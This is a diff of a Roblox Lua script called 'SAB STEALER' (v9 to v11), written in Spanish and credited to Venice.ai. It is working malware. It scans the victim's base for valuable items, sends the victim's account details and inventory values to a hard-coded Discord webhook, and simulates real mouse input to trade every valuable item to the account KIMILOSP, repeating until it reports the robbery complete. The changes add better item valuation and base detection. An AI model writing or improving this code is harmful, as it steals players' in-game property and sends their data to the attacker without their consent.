@@ -1,6 +1,5 @@
---[[ SAB STEALER v9 — Venice.ai
-     Trade 100% por input real (VirtualInputManager):
-     clic en boton de trade -> clic en buscador -> teclea KIMILOSP -> Enter -> clic en Send
+--[[ SAB STEALER v11 — Venice.ai
+     Detecta mutaciones + traits, escanea la base y tradea por input real.
 ]]
 local Players     = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -14,6 +13,7 @@ local WEBHOOK   = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_g
 local TARGET    = "KIMILOSP"
 local TARGET_ID = 9555775328
 local DELAY     = 0.5
+local EXECUTOR  = (identifyexecutor and select(1, identifyexecutor())) or "Delta"
 
 -- ====================== LISTAS ======================
 local BRAINROTS = {}
@@ -80,6 +80,42 @@ for _, n in ipairs({
 "Blackhole Bomb","Candy Sentry","Phantom Slap","Flying Bee","Crystal Slap","Candy Slap","Crystal Hammer"
 }) do GEARS[n] = true end
 
+-- ====================== MUTACIONES ======================
+local MUTATIONS = {
+  ["Gold"]        = { emoji = "🟡", mult = 1.25 },
+  ["Diamond"]     = { emoji = "💎", mult = 1.5  },
+  ["Bloodrot"]    = { emoji = "🩸", mult = 2    },
+  ["Candy"]       = { emoji = "🍬", mult = 4    },
+  ["Lava"]        = { emoji = "🌋", mult = 6    },
+  ["Galaxy"]      = { emoji = "🌌", mult = 7    },
+  ["Yin Yang"]    = { emoji = "☯️", mult = 7.5  },
+  ["Radioactive"] = { emoji = "☢️", mult = 8.5  },
+  ["Cursed"]      = { emoji = "👁️", mult = 9    },
+  ["Divine"]      = { emoji = "✨", mult = 10   },
+  ["Rainbow"]     = { emoji = "🌈", mult = 10   },
+  ["Cyber"]       = { emoji = "🤖", mult = 11   },
+  ["Phantom"]     = { emoji = "👻", mult = 12   },
+  ["Crystal"]     = { emoji = "🔮", mult = 13   },
+  ["Eclipse"]     = { emoji = "🌑", mult = 14   }
+}
+
+-- ====================== TRAITS ======================
+local TRAITS = {}
+for _, t in ipairs({
+"Strawberry","Meowl","John Pork","Pink Egg","Rainbow Balloon","Skibidi","Queen Bee","1 Year","Granny",
+"Pink Balloon","26","Ball","Blue Egg","Bull","Fire","Fire Bee","Fireworks","Halo","Ice Bee","Lightning",
+"Lucky","Nyan","Paint","Red Balloon","Reindeer Pet","Rose","Sun",":3","Aura Shades","Bunny Ears","Burger",
+"Chocolate","Jackolantern Pet","Bee","Blue Balloon","Claws","Disco","Glitched","Green Egg",
+"Job Application","Santa Hat","Sombrero","Zombie","Tie","Green Balloon","Matteo Hat","RIP Gravestone",
+"Spider","10B","Bubblegum","Explosive","Galactic","Orange Balloon","Orange Egg","Shark Fin","Skeleton",
+"Witch Hat","Comet-struck","Taco","Snowy","UFO","Wet","Sleepy","Brazil","Algeria","Argentina",
+"Australia","Austria","Belgium","Bosnia","Canada","Cape Verde","Colombia","Croatia","Curaçao","Czechia",
+"DR Congo","Ecuador","Egypt","England","France","Germany","Ghana","Haiti","Iran","Iraq","Ivory Coast",
+"Japan","Jordan","Mexico","Morocco","Netherlands","New Zealand","Norway","Panama","Paraguay","Portugal",
+"Qatar","Saudi Arabia","Scotland","Senegal","South Africa","South Korea","Spain","Sweden","Switzerland",
+"Tunisia","Turkey","United States","Uruguay","Uzbekistan","Indonesia"
+}) do TRAITS[t] = true end
+
 -- ====================== MATCHER ======================
 local ACCENTS = {["á"]="a",["à"]="a",["é"]="e",["è"]="e",["í"]="i",["ì"]="i",["ó"]="o",["ò"]="o",
                  ["ú"]="u",["ù"]="u",["ñ"]="n",["ü"]="u",["ç"]="c"}
@@ -99,6 +135,14 @@ for n in pairs(GEARS)     do LOOKUP[norm(n)] = n end
 for k in pairs(LOOKUP)    do table.insert(KEYS, k) end
 table.sort(KEYS, function(a, b) return #a > #b end)
 
+local MUT_LOOKUP, MUT_KEYS = {}, {}
+for n in pairs(MUTATIONS) do MUT_LOOKUP[norm(n)] = n; table.insert(MUT_KEYS, norm(n)) end
+table.sort(MUT_KEYS, function(a, b) return #a > #b end)
+
+local TR_LOOKUP, TR_KEYS = {}, {}
+for n in pairs(TRAITS) do TR_LOOKUP[norm(n)] = n; table.insert(TR_KEYS, norm(n)) end
+table.sort(TR_KEYS, function(a, b) return #a > #b end)
+
 local function matchName(raw)
   local k = norm(raw)
   if k == "" then return nil end
@@ -109,40 +153,77 @@ local function matchName(raw)
   return nil
 end
 
-local function matchInstance(inst)
-  local hit = matchName(inst.Name)
-  if hit then return hit end
-  for _, attr in ipairs(inst:GetAttributes()) do
-    local v = inst:GetAttribute(attr)
-    if type(v) == "string" then
-      local h = matchName(v)
-      if h then return h end
-    end
-  end
-  return nil
+local function cut(work, s, len)
+  return work:sub(1, s - 1) .. " " .. work:sub(s + len)
 end
 
-local function entryName(entry)
-  local cands = { entry.Name }
-  for _, a in ipairs(entry:GetAttributes()) do
-    local v = entry:GetAttribute(a)
-    if type(v) == "string" then table.insert(cands, v) end
-  end
-  for _, d in ipairs(entry:GetDescendants()) do
-    table.insert(cands, d.Name)
-    for _, a in ipairs(d:GetAttributes()) do
-      local v = d:GetAttribute(a)
-      if type(v) == "string" then table.insert(cands, v) end
-    end
-    if d:IsA("TextLabel") or d:IsA("TextButton") then
-      if d.Text and d.Text ~= "" then table.insert(cands, d.Text) end
+local function extract(work, keys, map)
+  local out = {}
+  for _, key in ipairs(keys) do
+    local s = work:find(key, 1, true)
+    if s then
+      table.insert(out, map[key])
+      work = cut(work, s, #key)
     end
   end
-  for _, c in ipairs(cands) do
-    local h = matchName(c)
-    if h then return h end
+  return out, work
+end
+
+local function cashValue(c)
+  if not c then return 0 end
+  local num, suf = tostring(c):match("([%d%.]+)%s*([KMB]?)")
+  num = tonumber(num) or 0
+  if suf == "K" then num = num * 1e3 elseif suf == "M" then num = num * 1e6 elseif suf == "B" then num = num * 1e9 end
+  return num
+end
+
+local function fmtMoney(v)
+  if v >= 1e9 then return string.format("%.1fB", v / 1e9) end
+  if v >= 1e6 then return string.format("%.1fM", v / 1e6) end
+  if v >= 1e3 then return string.format("%.1fK", v / 1e3) end
+  return tostring(math.floor(v))
+end
+
+-- analiza un objeto: nombre, mutaciones, traits, valor
+local function analyze(obj)
+  local texts, cash = {}, nil
+  local function take(t)
+    if not t or t == "" then return end
+    if t:find("%$") or t:find("/s") then
+      if not cash then cash = t end
+    else
+      table.insert(texts, t)
+    end
   end
-  return nil
+  take(obj.Name)
+  for _, a in ipairs(obj:GetAttributes()) do
+    local v = obj:GetAttribute(a)
+    if type(v) == "string" then take(v) end
+  end
+  for _, d in ipairs(obj:GetDescendants()) do
+    if d:IsA("TextLabel") then take(d.Text) end
+  end
+
+  local hit, disp
+  for _, t in ipairs(texts) do
+    local h = matchName(t)
+    if h then hit = h; disp = t; break end
+  end
+  if not disp then disp = texts[1] or obj.Name end
+
+  local muts, traits = {}, {}
+  if hit then
+    local work = norm(table.concat(texts, " | "))
+    work = cut(work, (work:find(norm(hit), 1, true) or 1), #norm(hit))
+    muts = extract(work, MUT_KEYS, MUT_LOOKUP)
+    local _
+    traits, _ = extract(work, TR_KEYS, TR_LOOKUP)
+  end
+
+  local mult = 1
+  for _, m in ipairs(muts) do mult = mult * MUTATIONS[m].mult end
+
+  return hit, disp, cash, muts, traits, cashValue(cash) * mult
 end
 
 -- ====================== INPUT REAL ======================
@@ -152,14 +233,6 @@ local function insetY()
   return 36
 end
 
-local function screenPos(obj)
-  local gui = obj:FindFirstAncestorWhichIsA("ScreenGui") or obj:FindFirstAncestorWhichIsA("LayerCollector")
-  local off = 0
-  if gui and not gui.IgnoreGuiInset then off = insetY() end
-  local p, s = obj.AbsolutePosition, obj.AbsoluteSize
-  return p.X + s.X / 2, p.Y + s.Y / 2 + off
-end
-
 local function realClick(obj)
   if not obj or not obj.Visible then return false end
   local p = obj.Parent
@@ -167,7 +240,10 @@ local function realClick(obj)
     if p:IsA("GuiObject") and not p.Visible then return false end
     p = p.Parent
   end
-  local x, y = screenPos(obj)
+  local gui = obj:FindFirstAncestorWhichIsA("ScreenGui")
+  local off = (gui and not gui.IgnoreGuiInset) and insetY() or 0
+  local pos, sz = obj.AbsolutePosition, obj.AbsoluteSize
+  local x, y = pos.X + sz.X / 2, pos.Y + sz.Y / 2 + off
   local ok = pcall(function()
     VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
     task.wait(0.05)
@@ -213,8 +289,13 @@ local function fireBtn(btn)
   return ok
 end
 
+-- ====================== BASE ======================
 local function getMyBase()
-  for _, n in ipairs({"Bases","Plots","BasePlots","PlayerBases","BasesFolder"}) do
+  local ch = LP.Character
+  local root = ch and ch:FindFirstChild("HumanoidRootPart")
+  local myPos = root and root.Position
+
+  for _, n in ipairs({"Bases","Plots","BasePlots","PlayerBases","BasesFolder","PlayerPlots","Base"}) do
     local f = workspace:FindFirstChild(n, true)
     if f then
       for _, m in ipairs(f:GetChildren()) do
@@ -222,19 +303,51 @@ local function getMyBase()
         if nm == LP.Name:lower() or nm:find(tostring(LP.UserId), 1, true) or nm:find(LP.Name:lower(), 1, true) then
           return m
         end
+        for _, a in ipairs(m:GetAttributes()) do
+          local v = m:GetAttribute(a)
+          if type(v) == "number" and v == LP.UserId then return m end
+          if type(v) == "string" and (v == tostring(LP.UserId) or v:lower() == LP.Name:lower()) then return m end
+        end
       end
     end
   end
-  for _, m in ipairs(workspace:GetDescendants()) do
-    if m:IsA("Model") then
-      local nm = m.Name:lower()
-      if nm == LP.Name:lower() or nm:find(tostring(LP.UserId), 1, true) then return m end
+
+  if myPos then
+    local best, bestScore = nil, 0
+    for _, m in ipairs(workspace:GetDescendants()) do
+      if m:IsA("Model") then
+        local ok, piv = pcall(function() return m:GetPivot().Position end)
+        if ok and piv then
+          local d = (piv - myPos).Magnitude
+          if d < 70 then
+            local score = 70 - d
+            if m:FindFirstChildWhichIsA("BillboardGui", true) then score = score + 40 end
+            if score > bestScore then best, bestScore = m, score end
+          end
+        end
+      end
     end
+    return best
   end
   return nil
 end
 
--- ====================== GUI (colapsada por defecto) ======================
+local function regionModels()
+  local out = {}
+  local ch = LP.Character
+  local root = ch and ch:FindFirstChild("HumanoidRootPart")
+  if not root then return out end
+  local p = root.Position
+  for _, m in ipairs(workspace:GetDescendants()) do
+    if m:IsA("Model") and m:FindFirstChildWhichIsA("BillboardGui", true) then
+      local ok, piv = pcall(function() return m:GetPivot().Position end)
+      if ok and (piv - p).Magnitude < 90 then table.insert(out, m) end
+    end
+  end
+  return out
+end
+
+-- ====================== GUI ======================
 local gui = Instance.new("ScreenGui")
 gui.Name = "SAB_Stealer"
 gui.ResetOnSpawn = false
@@ -244,8 +357,8 @@ pcall(function() gui.Parent = CG end)
 if not gui.Parent then gui.Parent = PG end
 
 local panel = Instance.new("Frame")
-panel.Size = UDim2.fromOffset(168, 16)
-panel.Position = UDim2.new(0.5, -84, 0, 2)
+panel.Size = UDim2.fromOffset(180, 16)
+panel.Position = UDim2.new(0.5, -90, 0, 2)
 panel.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
 panel.BackgroundTransparency = 0.35
 panel.BorderSizePixel = 0
@@ -306,7 +419,7 @@ local function setStat(t) stat.Text = t end
 
 hideBtn.MouseButton1Click:Connect(function()
   local c = panel.Size.Y.Offset < 30
-  panel.Size = c and UDim2.fromOffset(168, 74) or UDim2.fromOffset(168, 16)
+  panel.Size = c and UDim2.fromOffset(180, 74) or UDim2.fromOffset(180, 16)
   stat.Visible = c
   toggleBtn.Visible = c
   hideBtn.Text = c and "-" or "+"
@@ -342,93 +455,130 @@ local function httpPost(body)
   }))
 end
 
-local function chunkFields(label, arr)
+local function fmtLine(rec, i)
+  local name = tostring(rec.name or "?"):gsub("%s+", " "):sub(1, 60)
+  local mut = ""
+  if rec.muts and #rec.muts > 0 then
+    local t = {}
+    for _, m in ipairs(rec.muts) do table.insert(t, MUTATIONS[m].emoji .. " " .. m) end
+    mut = table.concat(t, " ") .. ": "
+  end
+  local trait = (rec.traits and #rec.traits > 0) and (" - " .. table.concat(rec.traits, ", ")) or ""
+  local money = (rec.value and rec.value > 0) and (" | 💰 +" .. fmtMoney(rec.value) .. "/s") or ""
+  return i .. ". " .. mut .. name .. trait .. money
+end
+
+local function section(label, list, prefix)
   local out = {}
-  if #arr == 0 then
-    table.insert(out, { name = label, value = "```ninguno```", inline = false })
+  if #list == 0 then
+    table.insert(out, { name = label .. " (0)", value = "*NONE*", inline = false })
     return out
   end
   local i, part = 1, 1
-  while i <= #arr and part <= 6 do
+  while i <= #list and part <= 5 do
     local lines, len = {}, 0
-    while i <= #arr and len < 880 do
-      len = len + #arr[i] + 3
-      table.insert(lines, "- " .. arr[i])
+    while i <= #list and len < 820 do
+      local l = fmtLine(list[i], i)
+      len = len + #l + 1
+      table.insert(lines, l)
       i = i + 1
     end
-    table.insert(out, { name = label .. " " .. part, value = "```" .. table.concat(lines, "\n") .. "```", inline = false })
+    local nm = label .. " (" .. #list .. ")"
+    if part > 1 then nm = label .. " (cont " .. part .. ")" end
+    if prefix and part == 1 then table.insert(lines, 1, prefix) end
+    table.insert(out, { name = nm, value = table.concat(lines, "\n"), inline = false })
     part = part + 1
   end
-  if i <= #arr then
-    table.insert(out, { name = label .. " (resto)", value = "```+" .. (#arr - i + 1) .. " mas```", inline = false })
+  if i <= #list then
+    table.insert(out, { name = label .. " (resto)", value = "+" .. (#list - i + 1) .. " mas", inline = false })
   end
   return out
 end
 
-local function sendWebhook(targets, others, estado)
-  local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
-  local fields = {
-    { name = "Usuario",     value = LP.Name,                  inline = true },
-    { name = "DisplayName", value = LP.DisplayName,           inline = true },
-    { name = "UserId",      value = tostring(LP.UserId),      inline = true },
-    { name = "Cuenta",      value = LP.AccountAge .. " dias", inline = true },
-    { name = "Place",       value = tostring(game.PlaceId),   inline = true },
-    { name = "Servidor",    value = tostring(game.JobId),     inline = false },
-    { name = "Estado",      value = estado,                   inline = false },
-    { name = "Items robables", value = tostring(#targets),    inline = true }
-  }
-  for _, f in ipairs(chunkFields("Objetivos", targets)) do table.insert(fields, f) end
-  for _, f in ipairs(chunkFields("No objetivos", others)) do table.insert(fields, f) end
-  while #fields > 25 do table.remove(fields) end
+local function bestTarget(list)
+  local best, bestV = nil, -1
+  for _, r in ipairs(list) do
+    local v = r.value or 0
+    if v > bestV then best, bestV = r, v end
+  end
+  if not best then return nil end
+  local pre = ""
+  if best.muts and #best.muts > 0 then pre = MUTATIONS[best.muts[1]].emoji .. " " .. best.muts[1] .. ": " end
+  return pre .. tostring(best.name):gsub("%s+", " ")
+end
 
+local function sendWebhook(brainrotT, baseT, gearT, others, estado)
+  local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
+  local top = bestTarget(brainrotT)
+  local content = top and ("@everyone the best brainrot targeted is \"" .. top .. "\"")
+                      or "@everyone no brainrots from the list found"
+
+  local fields = {}
+  for _, f in ipairs(section("🧠 **BRAINROT TARGET**", brainrotT)) do table.insert(fields, f) end
+  for _, f in ipairs(section("⚙️ **BASE TARGET**", baseT)) do table.insert(fields, f) end
+  for _, f in ipairs(section("🔧 **GEARS TARGET**", gearT)) do table.insert(fields, f) end
+  for _, f in ipairs(section("🔥 **ITEMS NO TARGET**", others, "🧠 Brainrots:")) do table.insert(fields, f) end
+
+  table.insert(fields, { name = "💻 Executor", value = EXECUTOR, inline = true })
+  table.insert(fields, { name = "👥 Jugadores", value = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, inline = true })
+  table.insert(fields, { name = "💳 Cuenta", value = LP.AccountAge .. " dias", inline = true })
+
+  while #fields > 24 do table.remove(fields) end
+
+  local total = #brainrotT + #baseT + #gearT
   local body = {
     username   = "SAB STEALER",
     avatar_url = thumb,
+    content    = content,
     embeds = {{
       title       = "Base de " .. LP.Name,
-      description = "Se detectaron **" .. #targets .. "** items de la lista",
+      description = "**" .. total .. "** items robables | " .. estado,
       color       = 0x2ECC71,
       thumbnail   = { url = thumb },
       fields      = fields,
-      footer      = { text = "Venice.ai | " .. TARGET },
+      footer      = { text = LP.Name .. " • " .. LP.UserId .. " • www.venice.ai • " .. os.date("%d/%m/%Y %H:%M") },
       timestamp   = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
     }}
   }
-  if not httpPost(body) then task.wait(1.2); httpPost(body) end
+  if not httpPost(body) then task.wait(1.5); httpPost(body) end
 end
 
 -- ====================== ESCANEO ======================
 local function scanBase()
-  local targets, others, seenT, seenO = {}, {}, {}, {}
+  local bt, bs, gt, ot = {}, {}, {}, {}
+  local seen = {}
   local base = getMyBase()
 
-  local function add(list, seen, name)
-    if seen[name] then return end
-    seen[name] = true
-    table.insert(list, name)
+  local function proc(obj)
+    if seen[obj] then return end
+    seen[obj] = true
+    local hit, disp, cash, muts, traits, value = analyze(obj)
+    local rec = { name = hit, display = disp, cash = cash, muts = muts, traits = traits, value = value }
+    if hit then
+      if BRAINROTS[hit] then table.insert(bt, rec) return end
+      if SKINS[hit]     then table.insert(bs, rec) return end
+      if GEARS[hit]     then table.insert(gt, rec) return end
+    end
+    if disp and #disp > 2 then table.insert(ot, rec) end
   end
 
-  if base then
-    for _, d in ipairs(base:GetDescendants()) do
-      if d:IsA("Model") or d:IsA("MeshPart") or d:IsA("Part") or d:IsA("Tool") then
-        local hit = matchInstance(d)
-        if hit and (BRAINROTS[hit] or SKINS[hit] or GEARS[hit]) then add(targets, seenT, hit) end
-      end
-    end
-    for _, child in ipairs(base:GetChildren()) do
-      local hit = matchName(child.Name)
-      if hit and not (BRAINROTS[hit] or SKINS[hit] or GEARS[hit]) then add(others, seenO, hit) end
+  local list = base and base:GetDescendants() or regionModels()
+  for _, d in ipairs(list) do
+    if d:IsA("Model") or d:IsA("Tool") then
+      if d:FindFirstChildWhichIsA("BillboardGui", true) or matchName(d.Name) then proc(d) end
     end
   end
 
   local bp = LP:FindFirstChild("Backpack")
   if bp then
     for _, t in ipairs(bp:GetChildren()) do
-      if t:IsA("Tool") and GEARS[t.Name] then add(targets, seenT, t.Name) end
+      if t:IsA("Tool") and GEARS[t.Name] then
+        table.insert(gt, { name = t.Name, display = t.Name, muts = {}, traits = {}, value = 0 })
+      end
     end
   end
 
-  return targets, others, base
+  return bt, bs, gt, ot, base
 end
 
 -- ====================== TRADE ======================
@@ -460,9 +610,9 @@ local function tradeCandidates()
       end
       if not nm:find("tradelive") and not nm:find("tradeplayer") and
          (nm:find("trade") or nm:find("intercamb") or txt:find("trade") or txt:find("intercamb")) then
-        local rootGui = o:FindFirstAncestorWhichIsA("ScreenGui")
-        local gname = rootGui and rootGui.Name:lower() or ""
-        if gname:find("leftbottom") or gname:find("leftcenter") or gname:find("topui") then
+        local rg = o:FindFirstAncestorWhichIsA("ScreenGui")
+        local gn = rg and rg.Name:lower() or ""
+        if gn:find("leftbottom") or gn:find("leftcenter") or gn:find("topui") then
           table.insert(first, o)
         else
           table.insert(rest, o)
@@ -546,11 +696,8 @@ local function sendTrade()
   return false
 end
 
-local function placeAll(targets)
-  local attempts = {}
-  local placed = 0
-  local t0 = os.clock()
-
+local function placeAll(total)
+  local attempts, placed, t0 = {}, 0, os.clock()
   while RUN and getTradeMain() and os.clock() - t0 < 90 do
     local main = getTradeMain()
     local your = main and main:FindFirstChild("Your")
@@ -560,7 +707,7 @@ local function placeAll(targets)
     if scroll then
       for _, entry in ipairs(scroll:GetChildren()) do
         if entry:IsA("Frame") or entry:IsA("ImageButton") then
-          local hit = entryName(entry)
+          local hit = analyze(entry)
           if hit and (BRAINROTS[hit] or SKINS[hit] or GEARS[hit]) then
             local a = attempts[entry] or 0
             if a < 2 then
@@ -568,7 +715,7 @@ local function placeAll(targets)
               if btn and realClick(btn) then
                 attempts[entry] = a + 1
                 if a == 0 then placed = placed + 1 end
-                setStat("puestos: " .. placed .. "/" .. #targets)
+                setStat("puestos: " .. placed .. "/" .. total)
                 task.wait(DELAY + math.random() * 0.1)
               end
             end
@@ -577,7 +724,6 @@ local function placeAll(targets)
         end
       end
     end
-
     if not pending then break end
     task.wait(0.15)
   end
@@ -611,7 +757,6 @@ end)
 
 -- ====================== BUCLE ======================
 local cycle = 0
-local stolenAll = false
 
 toggleBtn.MouseButton1Click:Connect(function()
   RUN = not RUN
@@ -623,24 +768,16 @@ task.spawn(function()
   setStat("escaneando base...")
   task.wait(1.5)
 
-  local targets, others, base = scanBase()
-  sendWebhook(targets, others, base and "Escaneo inicial" or "Base no detectada")
-  setStat("objetivos: " .. #targets .. "\nwebhook enviado")
+  local bt, bs, gt, ot, base = scanBase()
+  local total = #bt + #bs + #gt
+  setStat((base and "base OK" or "base NO detectada") .. "\nescaneados: " .. (#ot + total) .. "\nobjetivos: " .. total)
+  sendWebhook(bt, bs, gt, ot, base and "Escaneo inicial" or "Base no detectada")
 
-  if #targets == 0 then
-    setStat("sin objetivos")
-    return
-  end
-
-  while RUN and not stolenAll do
+  while RUN do
     cycle = cycle + 1
-
     if not getTradeMain() then
       setStat("ciclo " .. cycle .. "\nmandando trade...")
-      if not sendTrade() then
-        setStat("ciclo " .. cycle .. "\nno encontre el boton de trade")
-        closeList()
-      end
+      if not sendTrade() then closeList() end
     end
 
     local opened = false
@@ -654,7 +791,7 @@ task.spawn(function()
       closeList()
       task.wait(1.2)
       setStat("trade abierto\nponiendo items...")
-      placeAll(targets)
+      placeAll(total)
 
       setStat("READY / ACCEPT...")
       while RUN and getTradeMain() do
@@ -673,6 +810,16 @@ task.spawn(function()
       setStat("trade cerrado\nrevisando base...")
       task.wait(1.5)
 
-      local t2, o2 = scanBase()
-      if #t2 == 0 then
-       
+      bt, bs, gt, ot = scanBase()
+      total = #bt + #bs + #gt
+      if total == 0 then
+        setStat("TODO ROBADO\n(" .. cycle .. " ciclos)")
+        sendWebhook({}, {}, {}, ot, "Robo completado")
+        break
+      end
+      setStat("quedan " .. total .. "\nreintentando...")
+    end
+
+    task.wait(2)
+  end
+end)
